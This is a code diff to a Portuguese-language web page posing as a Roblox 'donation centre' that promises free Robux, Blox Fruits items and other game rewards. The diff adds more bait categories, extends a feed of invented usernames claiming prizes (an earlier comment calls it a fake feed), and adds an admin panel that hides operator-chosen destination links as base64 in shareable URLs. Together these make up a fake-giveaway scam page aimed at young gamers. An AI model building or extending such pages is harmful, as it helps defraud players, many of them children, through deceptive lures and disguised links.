@@ -47,6 +47,8 @@
             cursor: pointer;
         }
 
+        .donation-card:hover { border-color: #fff; box-shadow: 0 0 25px var(--neon-purple); transform: scale(1.01); }
+
         .card-header-gif {
             width: 100%;
             height: 150px;
@@ -63,7 +65,7 @@
             background: rgba(0, 0, 0, 0.5);
             padding: 15px;
             border-radius: 12px;
-            height: 80px;
+            height: 90px;
             overflow: hidden;
             border: 1px solid var(--border-purple);
             margin-top: 20px;
@@ -87,7 +89,7 @@
         }
 
         input {
-            width: 100%; padding: 12px; margin: 8px 0;
+            width: 100%; padding: 10px; margin: 8px 0;
             background: rgba(0,0,0,0.5); border: 1px solid var(--neon-purple);
             color: white; border-radius: 8px; box-sizing: border-box; outline: none;
         }
@@ -116,7 +118,7 @@
         <div id="adm-auth">
             <input type="text" id="adm-user" placeholder="Usuário">
             <input type="password" id="adm-pass" placeholder="Senha">
-            <button onclick="loginAdmin()">Entrar no Painel</button>
+            <button onclick="loginAdmin()">Entrar</button>
         </div>
         
         <div id="adm-content" class="hidden">
@@ -125,15 +127,17 @@
             <input type="text" id="link-gen" placeholder="Link Gen">
             <input type="text" id="link-mm2" placeholder="Link MM2">
             <input type="text" id="link-tsunami" placeholder="Link Tsunami">
+            <input type="text" id="link-brainrot" placeholder="Link Brainrot">
             <input type="text" id="link-blox" placeholder="Link Blox Fruits">
-            <button onclick="gerarLinkMultiplo()">GERAR LINK</button>
+            <input type="text" id="link-robux" placeholder="Link Robux">
+            <button onclick="gerarLinkMultiplo()">GERAR LINK COMPLETO</button>
             <div id="final-url"></div>
         </div>
     </div>
 
     <div id="panel-hub">
         <h2 id="welcome-msg" style="text-align: center; margin-bottom: 10px;">🎁 Central de Doações</h2>
-        <p style="text-align: center; font-size: 0.8rem; color: #d1b3ff; margin-bottom: 25px;">Escolha uma categoria abaixo!</p>
+        <p style="text-align: center; font-size: 0.8rem; color: #d1b3ff; margin-bottom: 25px;">Abaixo estão as doações ativas. Escolha uma categoria!</p>
 
         <div class="donation-card" onclick="irPara('gen')">
             <img src="https://i.imgur.com/wBBXouN.gif" class="card-header-gif">
@@ -151,11 +155,35 @@
             </div>
         </div>
 
+        <div class="donation-card" onclick="irPara('tsunami')">
+            <img src="https://i.imgur.com/wBBXouN.gif" class="card-header-gif">
+            <div class="card-body">
+                <h3>🌪️ FUJA DO TSUNAMI</h3>
+                <p>Doamos Infinity, Divinos e Celestiais no nosso servidor privado!</p>
+            </div>
+        </div>
+
+        <div class="donation-card" onclick="irPara('brainrot')">
+            <img src="https://i.imgur.com/wBBXouN.gif" class="card-header-gif">
+            <div class="card-body">
+                <h3>🧠 BRAINROT TD</h3>
+                <p>Unidades Secretas e Farm de moedas liberados para membros!</p>
+            </div>
+        </div>
+
         <div class="donation-card" onclick="irPara('blox')">
             <img src="https://i.imgur.com/wBBXouN.gif" class="card-header-gif">
             <div class="card-body">
                 <h3>🎃 BLOX FRUITS</h3>
                 <p>Frutas Perm, Gamepass e Frutas Físicas liberadas agora!</p>
+            </div>
+        </div>
+
+        <div class="donation-card" onclick="irPara('robux')">
+            <img src="https://i.imgur.com/wBBXouN.gif" class="card-header-gif">
+            <div class="card-body">
+                <h3>💎 ROBUX GRÁTIS</h3>
+                <p>Resgate pacotes de Robux diretamente na sua conta agora!</p>
             </div>
         </div>
 
@@ -172,16 +200,18 @@
         gen: params.get('l1') ? atob(params.get('l1')) : "#",
         mm2: params.get('l2') ? atob(params.get('l2')) : "#",
         tsunami: params.get('l3') ? atob(params.get('l3')) : "#",
-        blox: params.get('l4') ? atob(params.get('l4')) : "#"
+        brainrot: params.get('l4') ? atob(params.get('l4')) : "#",
+        blox: params.get('l5') ? atob(params.get('l5')) : "#",
+        robux: params.get('l6') ? atob(params.get('l6')) : "#"
     };
 
     if(params.get('m')) {
         document.getElementById('welcome-msg').innerText = "🎁 Doações de " + atob(params.get('m'));
     }
 
-    // LOGICA DO FEED FALSO
-    const nomes = ["pedro_blox", "ana.vitoria", "vini_ff", "caio_gamer", "julia.passos", "luiz_adm"];
-    const acoes = ["resgatou 1.000 Robux!", "pegou uma Kitsune Perm!", "acabou de ganhar Set Godly!", "resgatou conta com Fruit Notifier!", "ganhou 5.000 Robux no Gen!"];
+    // LISTA DE NOMES E RESGATES PARA O FEED
+    const nomes = ["user_roblox", "x_gamer_vibe", "vini_blox", "ana_kitsune", "luiz_godly", "pedro_adm", "felipe_fruits", "julia_rbx"];
+    const acoes = ["resgatou 1.000 Robux!", "recebeu uma Kitsune Perm!", "acabou de ganhar Set Godly!", "resgatou conta com Fruit Notifier!", "ganhou 5.000 Robux no Gen!", "ganhou uma Leopard Físicas!"];
 
     function updateFeed() {
         const container = document.getElementById('feed-container');
@@ -191,7 +221,7 @@
         const acaoAleatoria = acoes[Math.floor(Math.random() * acoes.length)];
         item.innerHTML = `✅ <b>${nomeAleatorio}</b> ${acaoAleatoria}`;
         
-        if (container.children.length > 1) { container.removeChild(container.firstChild); }
+        if (container.children.length > 2) { container.removeChild(container.firstChild); }
         container.appendChild(item);
     }
     setInterval(updateFeed, 3000);
@@ -219,9 +249,11 @@
         const l1 = btoa(document.getElementById('link-gen').value);
         const l2 = btoa(document.getElementById('link-mm2').value);
         const l3 = btoa(document.getElementById('link-tsunami').value);
-        const l4 = btoa(document.getElementById('link-blox').value);
+        const l4 = btoa(document.getElementById('link-brainrot').value);
+        const l5 = btoa(document.getElementById('link-blox').value);
+        const l6 = btoa(document.getElementById('link-robux').value);
         const base = window.location.href.split('?')[0];
-        document.getElementById('final-url').innerText = `${base}?m=${m}&l1=${l1}&l2=${l2}&l3=${l3}&l4=${l4}`;
+        document.getElementById('final-url').innerText = `${base}?m=${m}&l1=${l1}&l2=${l2}&l3=${l3}&l4=${l4}&l5=${l5}&l6=${l6}`;
     }
 </script>
 
